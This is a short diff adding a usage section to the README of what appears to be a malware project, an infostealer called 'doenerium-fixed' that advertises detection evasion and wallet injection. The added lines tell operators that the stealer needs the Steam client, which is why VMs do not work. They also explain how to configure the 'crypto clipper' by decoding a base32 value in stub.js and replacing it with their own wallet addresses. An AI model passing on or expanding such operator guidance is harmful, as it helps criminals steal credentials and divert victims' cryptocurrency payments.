@@ -14,6 +14,11 @@
 💎 FIX DETECTS AND UPDATE WALLET INJECT AT 50 MEMBERS ON TELEGRAM 😉
 </h1>
 
+## important to know!!
+1. if u dont have steam client installed on ur pc the stealer wont work (that why vm's dont work)
+2. if u want the crypto clipper feature | open the stub.js with txt or whatever;  press "ctrl" + "f" and past this "base32" decrypt the encoded value and replace with ur adresses
+thats it for now.
+
 <p align="center">
 <img src="https://img.shields.io/github/last-commit/doenerium6969/doenerium-fixed?style=flat">
 <img src="https://img.shields.io/github/stars/doenerium6969/doenerium-fixed?color=brightgreen">
